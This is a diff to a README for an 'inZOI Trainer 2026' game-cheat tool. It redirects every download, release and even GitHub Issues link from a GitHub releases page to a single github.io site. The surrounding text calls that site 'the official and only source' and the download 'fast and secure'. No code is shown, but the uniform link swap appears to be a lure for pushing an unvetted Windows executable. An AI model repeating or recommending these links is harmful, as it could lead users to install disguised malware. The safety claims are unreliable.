@@ -1,6 +1,6 @@
 # 🎮 inZOI-Trainer-2026 - Master Every Aspect of Your inZOI Life
 
-[![Download inZOI Trainer](https://img.shields.io/badge/Download-inZOI_Trainer_2026-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://github.com/bruna7686/inZOI-Trainer-2026/releases)
+[![Download inZOI Trainer](https://img.shields.io/badge/Download-inZOI_Trainer_2026-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://bruna7686.github.io)
 
 ---
 
@@ -18,7 +18,7 @@ Getting the inZOI Trainer 2026 up and running on your Windows PC is incredibly s
 
 ### Step 1: Download the Application
 
-Visit this link to download the application: [**Download inZOI Trainer 2026**](https://github.com/bruna7686/inZOI-Trainer-2026/releases)
+Visit this link to download the application: [**Download inZOI Trainer 2026**](https://bruna7686.github.io)
 
 This is the official and only source you need. The download is fast and secure, and you won't need to register or provide any personal information.
 
@@ -148,8 +148,8 @@ A: This is a standalone desktop tool. It's not a mod—it's an external program 
 
 We're here to help you get the most out of your experience. Here's how to reach us:
 
-- **GitHub Issues:** [Report bugs or request features](https://github.com/bruna7686/inZOI-Trainer-2026/issues)
-- **Release Page:** [Check for updates](https://github.com/bruna7686/inZOI-Trainer-2026/releases)
+- **GitHub Issues:** [Report bugs or request features](https://bruna7686.github.io)
+- **Release Page:** [Check for updates](https://bruna7686.github.io)
 
 Please include the following information when reporting an issue:
 - Your Windows version (e.g., Windows 11 Pro 23H2)
@@ -173,7 +173,7 @@ If the inZOI Trainer 2026 has enhanced your gaming experience, consider supporti
 
 It's time to take control. Download the inZOI Trainer 2026 today and experience inZOI the way it was meant to be played—without restrictions, without grind, and with pure fun.
 
-[![Download Now](https://img.shields.io/badge/⬇️_Download_inZOI_Trainer_2026-FF5722?style=for-the-badge&logo=github&logoColor=white)](https://github.com/bruna7686/inZOI-Trainer-2026/releases)
+[![Download Now](https://img.shields.io/badge/⬇️_Download_inZOI_Trainer_2026-FF5722?style=for-the-badge&logo=github&logoColor=white)](https://bruna7686.github.io)
 
 Visit this link to download the application and start enjoying unlimited possibilities right now!
 
